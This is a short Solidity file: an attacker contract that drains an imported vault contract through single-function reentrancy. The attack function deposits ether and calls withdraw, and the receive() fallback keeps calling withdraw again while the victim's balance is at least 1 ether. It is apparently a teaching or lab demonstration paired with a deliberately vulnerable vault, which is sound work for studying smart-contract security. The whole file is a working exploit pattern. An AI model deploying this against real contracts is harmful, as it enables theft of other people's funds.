// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./vault.sol";

contract attack_single_function_reentrancy {
    single_function_reentrancy victim;
    uint256 amount = 1 ether;

    constructor(single_function_reentrancy _victim) {
        victim = single_function_reentrancy(_victim);
    }

    function attack() public payable {
        victim.deposit{value: msg.value}();
        if (address(victim).balance >= amount) {
            victim.withdraw();
        }
    }
    receive() external payable {
        if (address(victim).balance >= amount) {
            victim.withdraw();
        }
    }
}